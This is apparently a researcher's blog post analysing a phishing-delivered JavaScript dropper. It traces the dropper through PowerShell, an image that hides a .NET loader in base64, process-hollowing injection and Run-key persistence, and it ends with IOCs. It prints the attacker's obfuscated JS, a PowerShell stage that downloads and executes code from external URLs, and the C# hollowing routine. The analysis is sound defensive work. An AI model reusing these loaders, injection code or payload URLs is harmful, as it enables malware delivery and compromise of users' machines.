---
title: Stego Campaign
date: 2024-09-10 18:55:00 +0800
categories: [Malware,DLL,.NET,Injection,Javascript,Dropper]
tags: [.Net]
pin: true
---

### Introduction
![Stego](https://raw.githubusercontent.com/kzimmermann/stego/main/stego_logo.png "Stego")

Recently while browsing Bazaar I saw a JS file uploaded and it peaked my interest again. As we analysed a JS dropper based in Brazil in the last [blog](https://somedieyoungzz.github.io/posts/ta558/). I thought it would be a nice idea to get more hands on the Javascript based droppers and this sample was really straight forward and fun to analyse. Tags on bazaar show that this sample was distributed via e-mail attachment so some kind of phising mails must have been send.

### Phase 1 
![VT](https://cdn-images-1.medium.com/v2/resize:fit:800/1*UNT7sqP0b2qz0ndjCgocdw.png "VT")

&rarr; VT shows a really low score of only 6 and it detects it as a MP3 file. Even though the original file name is given below as **Proforma invoices.js**. This may have been related to how the file was sent over during the phising as an MP3 or something else.

![JS](https://cdn-images-1.medium.com/v2/resize:fit:800/1*AOMCHdwc-SF-s-fF0ND-kA.png "JS")
&rarr; The oringal JS file contains a lot of unecessary strings repeated over making the file tough to understand and it also has many redudant functions that are not at all referenced anywhere else. Removing all these things we're left with little bit of obufuscation and the main payload.

```js

	var arrefanhar = "䷲ ➙ ⋪ ⤖ ㌍";
        var jaquete = " long ass payload"
        jaquete += "long ass payload again"
        jaquete += "long ass payload again"
	jaquete += "long ass payload again"
	// repeated like 50 times
	jaquete = jaquete.split(arrefanhar).join("");
        jaquete = jaquete.split("").reverse().join("");
        var deilo = new ActiveXObject("WScript.Shell");
        var joanino = "䷲ ➙ ⋪ ⤖ ㌍$C䷲ ➙ ⋪ ⤖ ㌍o";
        joanino += "䷲ ➙ ⋪ ⤖ ㌍F䷲ ➙ ⋪ ⤖ ㌍r䷲ ➙ ⋪ ⤖ ㌍o";
        // this too repeated like 50 times
        joanino = joanino.split(arrefanhar).join("");
        var mycogenia = "p䷲ ➙ ⋪ ⤖ ㌍o";
        var mycogenia = "p䷲ ➙ ⋪ ⤖ ㌍o";
        mycogenia += "䷲ ➙ ⋪ ⤖ ㌍wer";
        mycogenia += "䷲ ➙ ⋪ ⤖ ㌍sh䷲ ➙ ⋪ ⤖ ㌍e";
        mycogenia += "䷲ ➙ ⋪ ⤖ ㌍l䷲ ➙ ⋪ ⤖ ㌍l -䷲ ➙ ⋪ ⤖ ㌍co";
        mycogenia += "䷲ ➙ ⋪ ⤖ ㌍m䷲ ➙ ⋪ ⤖ ㌍ma";
        mycogenia += "䷲ ➙ ⋪ ⤖ ㌍n䷲ ➙ ⋪ ⤖ ㌍d ䷲ ➙ ⋪ ⤖ ㌍";
        mycogenia += joanino;
        mycogenia = mycogenia.split(arrefanhar).join("");
        var bodelgo = WScript.CreateObject("WScript.Shell");
        bodelgo.Run(mycogenia, 0, true);
```

&rarr; The working is straight forward, the **arrefanhar** variable is used as an delimiter. It splits the string using arrefanhar as a delimiter, then rejoins the remaining parts without those symbols. This removes the obfuscation.

&rarr; The variable **jaquete** is repeatedly concatenated to avoid static detection ig.The payload is then reversed using **.split("").reverse().join("")** adding another layer of obfuscation. Similarly is done with the **joanino** variable.

&rarr; The end payload looks something like this . We can decode the payload using Cyberchef or any other tools that you'd like.

```powershell
powershell -command $Codigo = 'base 64 payload';
$OWjuxD = [system.Text.encoding]::Unicode.GetString([system.Convert]::Frombase64String($Codigo));
powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command $OWjuxD
```

### Phase 2 
&rarr; The decode base64 payload is given below 

```powershell
$imageUrl = 'https://ia601606.us.archive.org/10/items/deathnote_202407/deathnote.jpg';
$webClient = New-Object System.Net.WebClient;
$imageBytes = $webClient.DownloadData($imageUrl);
$imageText = [System.Text.Encoding]::UTF8.GetString($imageBytes);
$startFlag = '<<BASE64_START>>';
$endFlag = '<<BASE64_END>>';
$startIndex = $imageText.IndexOf($startFlag);
$endIndex = $imageText.IndexOf($endFlag);
$startIndex -ge 0 -and $endIndex -gt $startIndex;
$startIndex += $startFlag.Length;
$base64Length = $endIndex - $startIndex;
$base64Command = $imageText.Substring($startIndex, $base64Length);
$commandBytes = [System.Convert]::FromBase64String($base64Command);
$loadedAssembly = [System.Reflection.Assembly]::Load($commandBytes);
$type = $loadedAssembly.GetType('dnlib.IO.Home');
$method = $type.GetMethod('VAI').Invoke($null, [object[]] ('txt.5ln/ved.2r.39b345302a075b1bc0d45b632eb9ee62-bup//:sptth' , 'desativado' , 'desativado' , 'desativado','AddInProcess32','desativado'))
```

- The payload can be divied into 3 parts
	+ **Download and Extract Payload** - This part downloads an image called **Deathnote.jpg(xd)** and converts it into UTF-8 string. The image contains hidden base64 data enclosed between special markers **<<BASE64_START>>** and **<<BASE64_END>>**
	+ **Decode and Load Assembly** - The base64 payload is decoded into a byte array and dynamically loads this assembly into memory using reflection.
	+ **Execute** - The **VAI** method from a class in the loaded assembly called **dnlib.IO.Home** is called with various parameters.
- We can get the base64 payload from the image using Cyberchef or Python.

```python
import base64
with open("deathnote.jpg", "rb") as image_file:
    image_data = image_file.read().decode('utf-8', 'ignore')

start_flag = "<<BASE64_START>>"
end_flag = "<<BASE64_END>>"

start_index = image_data.find(start_flag)
end_index = image_data.find(end_flag)

if start_index != -1 and end_index != -1:

    start_index += len(start_flag)
    base64_content = image_data[start_index:end_index].strip()
    decoded_bytes = base64.b64decode(base64_content)
    
    with open("decoded_output.bin", "wb") as output_file:
        output_file.write(decoded_bytes)
    
    print("Base64 content saved to decoded_output.bin")
else:
    print("Base64 markers not found in the image text.")

```

### Phase 3
&rarr; Since we already know this a .Net file we can load it up in the dnSpy and understand the working of **VAI** method in **Home** class.
![DIE](https://cdn-images-1.medium.com/v2/resize:fit:800/1*u2Lmb9DG4MNWeo6Cp6kHtw.png "DIE")
*DiE detects it as a .Net DLL*

![DNS](https://cdn-images-1.medium.com/v2/resize:fit:800/1*-p5TaPiFNE0mZ-u5JpSIZw.png "DNS")
#### VAI Code Disassembly
- The .Net code is not all deobfuscated and is really simple to understand. But before we look into the code, let's try understand the parameters that were earlier passed to this function.
	+ The **VAI** method is called with 6 parameters as we've confirmed in DnSpy.
		* The **QBXtX** variable in parameter corresponds to the URL and from general observation we know that URL is reversed so we can expect to see some string reversing.
		![REV](https://cdn-images-1.medium.com/v2/resize:fit:800/1*hvFDGBe4HXJUUsQET1ktWA.png "REV")
		* The *desativado* variable is being used again and again for next 3 parameters. **startupreg** if set to 1 leads to calling of **Class2** in if-else statement.
		* The **caminhovbs** and **namevbs** are maybe here referred to here as VB Script and Path as we can infer from Class2 function later on.
		* **AddInProcess32** is being used as a parameter to construct the path to a specific executable, e.g., **C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe**
- One interesting thing to note is the name of variables being used. Some of these variables names are from Portuguese. For eg
	+ desativado - disabled 
	+ caminho - path
	+ It could be specifically aimed at users in Portuguese-speaking countries, such as Brazil or I'm just shooting in blind.

- The URL is reveresed and it is downloaded.
- The downloaded payload is decoded from Base64 and saved to the .NET folder as AddInProcess32.exe and then executed using the **Tools.Ande** class.
#### Class2 Code Disassembly
&rarr; Before diving into the main execution code let's look at the Class2 which was suppose to execute if **startupreg2** was set to 1.

![Reg](https://cdn-images-1.medium.com/v2/resize:fit:800/1*seueeNdj9X6PTDFe2svSWw.png "Reg")
*Registry Manipulations Huh Shocker*

- This Class2.Start method is designed to check if a specific JavaScript file exists in the given directory (caminhovbs). If the file does not exist, it  copies all .js files to the specified path and waits for the process to complete. The file copying is done silently as the process window is hidden.
- Additionally, the method attempts to set a registry key under **HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run** to add the .js file to the system's startup , establishing persistence.

#### Tools Code Disassembly
- Since the code is big we will try to divide it in parts and try understand the overall flow of how the file downloaded is being executed.

```csharp
public static bool Ande(byte[] data, string path)
{
    int num = 1;
    checked
    {
        for (;;)
        {
            bool flag = Tools.HandleRun(path, string.Empty, data, true);
            if (flag)
            {
                break;
            }
            num++;
            if (num > 5)
            {
                goto Block_2;
            }
        }
        return true;
    }
    Block_2:
    return false;
}

```

&rarr; It takes two parameters **data** and **path** to the executable. The data is the malicious payload downloaded in previous step and the path is the AddInProcess32.exe. It tries to run the code for 5 times calling **HandleRun** function to execute the payload.
```cs
private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
{
    // Starts the target process and prepares to inject the payload
}
```
&rarr; This method does the heavy lifting by creating the process and manipulating its memory to inject the payload.
```cs
API.STARTUP_INFORMATION startup_INFORMATION = default(API.STARTUP_INFORMATION);
API.PROCESS_INFORMATION process_INFORMATION = default(API.PROCESS_INFORMATION);
// Creating the target process
if (!API.CreateProcess_API(path, text, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, null, ref startup_INFORMATION, ref process_INFORMATION))
{
    throw new Exception();
}
```
&rarr; This section creates a new Process and initializes **STARTUP_INFORMATION** and **PROCESS_INFORMATION** structures to manage the new process.
```cs
int num3 = array[41];
int num4 = 0;
int num5 = 0;
if (!API.ReadProcessMemory_API(process_INFORMATION.ProcessHandle, num3 + 8, ref num4, 4, ref num5))
{
    throw new Exception();
}
if (num2 == num4 && API.NtUnmapViewOfSection_API(process_INFORMATION.ProcessHandle, num4) != 0)
{
    throw new Exception();
}
```

&rarr; Basic thread context manipulation is done here and the memory is unmapped to make space for the payload.
```cs
int num8 = API.VirtualAllocEx_API(process_INFORMATION.ProcessHandle, num2, num6, 12288, 64);
if (num8 == 0)
{
    throw new Exception();
}
if (!API.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, num8, data, num7, ref num5))
{
    throw new Exception();
}
```
&rarr; This allocates the memory in the process using **VirtualAllocEx** and writes the payload using **WriteProcessMemory**. Just the standard stuff.
```cs
byte[] bytes = BitConverter.GetBytes(num8);
if (!API.WriteProcessMemory_API(process_INFORMATION.ProcessHandle, num3 + 8, bytes, 4, ref num5))
{
    throw new Exception();
}
if (API.ResumeThread_API(process_INFORMATION.ThreadHandle) == -1)
{
    throw new Exception();
}

```
&rarr; Here the entry point of the process is adjusted nichely making sure when the process is resumed, it executes the malicious code. Later on the thread is resumed.

- This technique used by the threat actor is called **Process Hollowing** and is sophisticated in nature. If you wish to read more about the technique you can refer to the blog [here](https://attack.mitre.org/techniques/T1055/012/).

### Phase 4
- We can dump the next stage payload either running the DLL using RunDotNetDLL or like the cool nerds we are, we can download the payload directly from the URL(don't recommend).
![Chef](https://cdn-images-1.medium.com/v2/resize:fit:800/1*S1wFO6y-W7fWyfTc-XHQkw.png "Chef")

- The payload is heavily packed obfuscated .Net file, even running tools like de4dot fails as it's got anti de4dot.
- Even though code is very bad to understand, we can see some references to API hashing and other .

![API](https://cdn-images-1.medium.com/v2/resize:fit:800/1*tQNVp3fTZTWroogckGfsAQ.png "API")
![DBG](https://cdn-images-1.medium.com/v2/resize:fit:800/1*xnYhDoEM6a-kNQGl5XdJXA.png "DBG")
*Presence of Debugger Check*
![DBG](https://cdn-images-1.medium.com/v2/resize:fit:800/1*S2pzPj6fV89cWbYeqLzWDA.png "DBG")

- We can see a check for debugger and patch it and go further. Patching can be done either way by changing the **JNZ** to **JMP** or replacing the call with **NOP**.
- Late on we can see the binary unpacking a DLL which further is injected into explorer.exe using the same process we saw earlier.
![STR](https://cdn-images-1.medium.com/v2/resize:fit:800/1*ih_6jGKeQ84C9jHHk5zIxA.png "STR")
*String Decryptiom Algorithm*
![C2](https://cdn-images-1.medium.com/v2/resize:fit:800/0*RYiW84aBmBbsNufl "C2")
*C2 URL*
- The same C2 has been constantly used over and over by many Stego and other campaigns to drop other payloads etc .
![VT](https://cdn-images-1.medium.com/v2/resize:fit:800/0*82H5uiylk0xNZ0Xl "VT")

### IOC
```
f9f6a728e3728ccb7f52c3b0b8c64dcf stage_1-1.js
c639542f337f5a9b8ba27104dff86158  stage_2_payload.ps1
56398e25cbed9287de5fe7b463eeb974  stage_3_payload.dll
7a47db5c25aaae2b0772c78f70983681  stage_4.exe
7a47db5c25aaae2b0772c78f70983681  stage_4_unpacked

Deathnote.jpg - https://ia601606.us.archive.org/10/items/deathnote_202407/deathnote.jpg

hxxps://pub-26ee9be236b54d0cb1b570a203543b93.r2.dev/nl5.txt

```
[Virustotal](https://www.virustotal.com/gui/file/cac654b47278dd85f72e5886d9bf2571354e142961c892bca249a5fdc3d0183e/details)

[AnyRun](https://app.any.run/tasks/9de69cc3-22ab-486d-90c8-97999fa072e9)

Thank You for reading this till the end ❤

Discord somedieyoungzz

Twitter https://twitter.com/IdaNotPro
